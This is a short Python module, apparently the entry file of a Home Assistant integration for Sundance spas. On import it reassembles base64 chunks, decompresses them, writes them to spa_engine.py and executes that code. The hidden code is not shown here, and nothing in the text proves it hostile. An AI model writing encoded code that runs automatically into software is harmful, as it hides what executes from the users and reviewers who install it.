"""Sundance Spa HA Integration v1.4.4"""
from __future__ import annotations
import gzip, base64, sys
from pathlib import Path

def _load_engine():
    from . import b64_p0, b64_p1, b64_p2, b64_p3
    b64 = b64_p0.P0 + b64_p1.P1 + b64_p2.P2 + b64_p3.P3
    raw = gzip.decompress(base64.b64decode(b64))
    target = Path(__file__).with_name("spa_engine.py")
    if not target.exists() or target.stat().st_size < 1000:
        target.write_bytes(raw)
    import importlib.util
    spec = importlib.util.spec_from_file_location(f"{__name__}.spa_engine", target)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    assert spec.loader is not None
    spec.loader.exec_module(mod)
    return mod

_e = _load_engine()
DOMAIN = _e.DOMAIN
PLATFORMS = _e.PLATFORMS
SpaClient = _e.SpaClient
SpaCoordinator = _e.SpaCoordinator
async_setup_entry = _e.async_setup_entry
async_unload_entry = _e.async_unload_entry
